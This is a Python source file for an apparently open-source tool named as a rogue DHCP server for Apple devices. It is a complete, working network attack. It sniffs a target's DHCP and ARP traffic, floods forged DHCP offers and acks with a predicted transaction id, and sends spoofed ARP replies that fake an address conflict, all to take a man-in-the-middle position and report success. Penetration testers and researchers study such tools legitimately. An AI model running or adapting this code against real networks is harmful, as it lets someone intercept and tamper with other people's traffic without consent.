#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# region Description
"""
apple_rogue_dhcp.py: Rogue DHCP server for Apple devices
Author: Vladimir Ivanov
License: MIT
Copyright 2020, Raw-packet Project
"""
# endregion

# region Import
from sys import path
from os.path import dirname, abspath
from sys import exit
from argparse import ArgumentParser
from socket import socket, AF_PACKET, SOCK_RAW, htons
from time import sleep
from datetime import datetime
from typing import Union, Dict
# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2020, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.2.1'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Production'
# endregion


# region Global variables
requested_ip: Union[None, str] = None
new_transaction_id: int = 0

print_possible_mitm: bool = False
print_success_mitm: bool = False

target_mac_address: Union[None, str] = None
target_ip_address: Union[None, str] = None
your_mac_address: Union[None, str] = None
your_ip_address: Union[None, str] = None

sniff_raw_socket: Union[None, socket] = None
send_raw_socket: Union[None, socket] = None
# endregion


# region DHCP response sender
def dhcp_response_sender():
    if args.broadcast:
        offer_packet = dhcp.make_offer_packet(ethernet_src_mac=your_mac_address,
                                              ip_src=your_ip_address,
                                              transaction_id=new_transaction_id,
                                              your_client_ip=target_ip_address,
                                              client_mac=target_mac_address)

        ack_packet = dhcp.make_ack_packet(ethernet_src_mac=your_mac_address,
                                          ip_src=your_ip_address,
                                          transaction_id=new_transaction_id,
                                          your_client_ip=target_ip_address,
                                          client_mac=target_mac_address)
    else:
        offer_packet = dhcp.make_offer_packet(ethernet_src_mac=your_mac_address,
                                              ethernet_dst_mac=target_mac_address,
                                              ip_src=your_ip_address,
                                              transaction_id=new_transaction_id,
                                              your_client_ip=target_ip_address,
                                              client_mac=target_mac_address)

        ack_packet = dhcp.make_ack_packet(ethernet_src_mac=your_mac_address,
                                          ethernet_dst_mac=target_mac_address,
                                          ip_src=your_ip_address,
                                          transaction_id=new_transaction_id,
                                          your_client_ip=target_ip_address,
                                          client_mac=target_mac_address)

    start_time: datetime = datetime.now()
    while (datetime.now() - start_time).seconds <= 15:
        send_raw_socket.send(offer_packet)
        send_raw_socket.send(ack_packet)
        sleep(0.00001)
# endregion


# region Reply to DHCP and ARP requests
def reply(request: Dict[str, Dict[Union[int, str], Union[int, str]]]):

    global requested_ip
    global new_transaction_id
    global print_possible_mitm
    global print_success_mitm
    global target_mac_address
    global target_ip_address
    global your_mac_address
    global your_ip_address
    global send_raw_socket

    # region DHCP REQUESTS
    if 'DHCPv4' in request.keys():

        # region Get DHCP transaction id
        transaction_id = request['BOOTP']['transaction-id']
        # endregion

        # region DHCP DECLINE
        if request['DHCPv4'][53] == 4:
            base.print_info('DHCP DECLINE from: ', target_mac_address, ' transaction id: ', hex(transaction_id))
            if new_transaction_id != 0:
                tm.add_task(dhcp_response_sender)
        # endregion

        # region DHCP REQUEST
        if request['DHCPv4'][53] == 3:

            # region Get next DHCP transaction id
            if transaction_id != 0:
                new_transaction_id = transaction_id + 1
                base.print_info('Current transaction id: ', hex(transaction_id))
                base.print_success('Next transaction id: ', hex(new_transaction_id))
            # endregion

            # region Get DHCP requested ip address
            if 50 in request['DHCPv4'].keys():
                requested_ip = str(request['DHCPv4'][50])
            # endregion

            # region Print info message
            base.print_info('DHCP REQUEST from: ', target_mac_address, ' transaction id: ', hex(transaction_id),
                            ' requested ip: ', requested_ip)
            # endregion

            # region If requested IP is target IP - print Possible mitm success
            if requested_ip == target_ip_address:
                if not print_possible_mitm:
                    base.print_warning('Possible MiTM success: ', target_ip_address + ' (' + target_mac_address + ')')
                    print_possible_mitm = True
            # endregion

        # endregion

    # endregion

    # region ARP REQUESTS
    if 'ARP' in request.keys():
        if requested_ip is not None:
            if request['Ethernet']['destination'] == 'ff:ff:ff:ff:ff:ff' and \
                    request['ARP']['target-mac'] == '00:00:00:00:00:00':

                # region Set local variables
                arp_sender_mac_address = request['ARP']['sender-mac']
                arp_sender_ip_address = request['ARP']['sender-ip']
                arp_target_ip_address = request['ARP']['target-ip']
                # endregion

                # region Print info message
                base.print_info('ARP request from: ', arp_sender_mac_address, ' "',
                                'Who has ' + arp_target_ip_address + '? Tell ' + arp_sender_ip_address, '"')
                # endregion

                # region ARP target IP is DHCP requested IP
                if arp_target_ip_address == requested_ip:

                    # region If ARP target IP is target IP - print Possible mitm success
                    if arp_target_ip_address == target_ip_address:
                        if not print_possible_mitm:
                            base.print_warning('Possible MiTM success: ',
                                               target_ip_address + ' (' + target_mac_address + ')')
                            print_possible_mitm = True
                    # endregion

                    # region If ARP target IP is not target IP - send 'IPv4 address conflict' ARP response
                    else:
                        arp_reply = arp.make_response(ethernet_src_mac=your_mac_address,
                                                      ethernet_dst_mac=target_mac_address,
                                                      sender_mac=your_mac_address,
                                                      sender_ip=requested_ip,
                                                      target_mac=arp_sender_mac_address,
                                                      target_ip=arp_sender_ip_address)
                        for _ in range(5):
                            send_raw_socket.send(arp_reply)
                        base.print_info('ARP response to:  ', arp_sender_mac_address, ' "',
                                        arp_target_ip_address + ' is at ' + your_mac_address,
                                        '" (IPv4 address conflict)')
                    # endregion

                # endregion

                # region ARP target IP is your IP - MITM SUCCESS
                if arp_target_ip_address == your_ip_address:
                    if not print_success_mitm:
                        base.print_success('MITM success: ', target_ip_address + ' (' + target_mac_address + ')')
                        print_success_mitm = True
                    exit(0)
                # endregion
    # endregion

# endregion


# region Main function
if __name__ == '__main__':

    # region Raw-packet modules
    path.append(dirname(dirname(dirname(abspath(__file__)))))
    from raw_packet.Utils.base import Base
    from raw_packet.Utils.network import RawEthernet, RawARP, RawIPv4, RawUDP, RawDHCPv4
    from raw_packet.Utils.tm import ThreadManager
    # endregion

    # region Check user, platform and create threads
    base = Base()
    base.check_user()
    base.check_platform()
    tm = ThreadManager(3)
    # endregion

    # region Set variables
    eth: RawEthernet = RawEthernet()
    arp: RawARP = RawARP()
    ip: RawIPv4 = RawIPv4()
    udp: RawUDP = RawUDP()
    dhcp: RawDHCPv4 = RawDHCPv4()
    # endregion

    try:
        # region Parse script arguments
        parser = ArgumentParser(description='Rogue DHCP server for Apple devices')
        parser.add_argument('-i', '--interface', help='Set interface name for send DHCP reply packets')
        parser.add_argument('-m', '--target_mac', help='Set target MAC address, required!', required=True)
        parser.add_argument('-t', '--target_new_ip', help='Set new client IP address, required!', required=True)
        parser.add_argument('-b', '--broadcast', action='store_true', help='Send broadcast DHCPv4 responses')
        parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
        args = parser.parse_args()
        # endregion

        # region Print banner if argument quit is not set
        if not args.quiet:
            base.print_banner()
        # endregion

        # region Get your network settings
        if args.interface is None:
            base.print_warning('Please set a network interface for sniffing ARP and DHCP requests ...')
        current_network_interface = base.network_interface_selection(args.interface)
        your_mac_address = base.get_interface_mac_address(current_network_interface)
        your_ip_address = base.get_interface_ip_address(current_network_interface)
        your_network = base.get_interface_network(current_network_interface)
        # endregion

        # region Check target MAC and IPv4 address
        target_mac_address = str(args.target_mac).lower()
        assert base.mac_address_validation(target_mac_address), \
            'Bad target MAC address: ' + base.error_text(target_mac_address)

        target_ip_address = str(args.target_new_ip)
        assert base.ip_address_validation(target_ip_address), \
            'Bad target IP address: ' + base.error_text(target_ip_address)
        assert base.ip_address_in_network(target_ip_address, your_network), \
            'Target IP address not in network: ' + base.error_text(your_network)
        # endregion

        # region Create raw socket for send and sniff packets
        send_raw_socket = socket(AF_PACKET, SOCK_RAW)
        sniff_raw_socket = socket(AF_PACKET, SOCK_RAW, htons(0x0003))
        send_raw_socket.bind((current_network_interface, 0))
        # endregion

        # region Sniff network

        # region Print info message
        base.print_info('Waiting for a ARP or DHCP requests from: ', target_mac_address)
        # endregion

        # region Start sniffing
        while True:
            # region Get packets from RAW socket
            packets = sniff_raw_socket.recvfrom(2048)
            for packet in packets:
                try:
                    # Get Ethernet header from packet
                    ethernet_header = packet[0:eth.header_length]
                    ethernet_header_dict = eth.parse_header(ethernet_header)

                    # Success parse Ethernet header
                    assert ethernet_header_dict is not None, \
                        'Bad Ethernet packet!'

                    # Target MAC address is source MAC address
                    assert ethernet_header_dict['source'] == target_mac_address, \
                        'Source Ethernet MAC address is not target MAC address!'

                    # region ARP packet

                    # 2054 - Type of ARP packet (0x0806)
                    if ethernet_header_dict['type'] == arp.packet_type:
                        # Get ARP packet
                        arp_packet = packet[eth.header_length:eth.header_length + arp.packet_length]
                        arp_packet_dict = arp.parse_packet(arp_packet)

                        # Success parse ARP packet
                        assert arp_packet_dict is not None, \
                            'Bad ARP packet!'

                        # ARP packet is ARP request
                        assert arp_packet_dict['opcode'] == 1, \
                            'Is not ARP request!'

                        # Reply to this request
                        reply(request={'Ethernet': ethernet_header_dict, 'ARP': arp_packet_dict})

                    # endregion

                    # region DHCP packet

                    # 2048 - Type of IP packet (0x0800)
                    if ethernet_header_dict['type'] == ip.header_type:
                        # Get IP header
                        ip_header = packet[eth.header_length:]
                        ip_header_dict = ip.parse_header(ip_header)

                        # Success parse IPv4 header
                        assert ip_header_dict is not None, \
                            'Bad IPv4 packet!'

                        # Is UDP packet
                        assert ip_header_dict['protocol'] == udp.header_type, \
                            'Is not UDP packet!'

                        # Get UDP header offset
                        udp_header_offset = eth.header_length + (ip_header_dict['length'] * 4)

                        # Get UDP header
                        udp_header = packet[udp_header_offset:udp_header_offset + udp.header_length]
                        udp_header_dict = udp.parse_header(udp_header)

                        # Success parse UDP header
                        assert udp_header is not None, \
                            'Bad UDP packet!'

                        # UDP source port 68 and destination port 67
                        assert udp_header_dict['source-port'] == 68 and udp_header_dict['destination-port'] == 67, \
                            'Bad UDP ports!'

                        # Get DHCP header offset
                        dhcp_packet_offset = udp_header_offset + udp.header_length

                        # Get DHCP packet
                        dhcp_packet = packet[dhcp_packet_offset:]
                        dhcp_packet_dict = dhcp.parse_packet(dhcp_packet)

                        # Success parse DHCPv4 header
                        assert dhcp_packet_dict is not None, \
                            'Bad DHCPv4 packet!'

                        # Create full request
                        packet = {
                            'Ethernet': ethernet_header_dict,
                            'IP': ip_header_dict,
                            'UDP': udp_header_dict
                        }
                        packet.update(dhcp_packet_dict)

                        # Reply to this request
                        reply(request=packet)

                        # endregion

                    # endregion

                except AssertionError:
                    pass
            # endregion

        # endregion

        # endregion

    except KeyboardInterrupt:
        base.print_info('Exit ....')
        exit(0)

    except AssertionError as Error:
        base.print_error(Error.args[0])
        exit(1)

# endregion
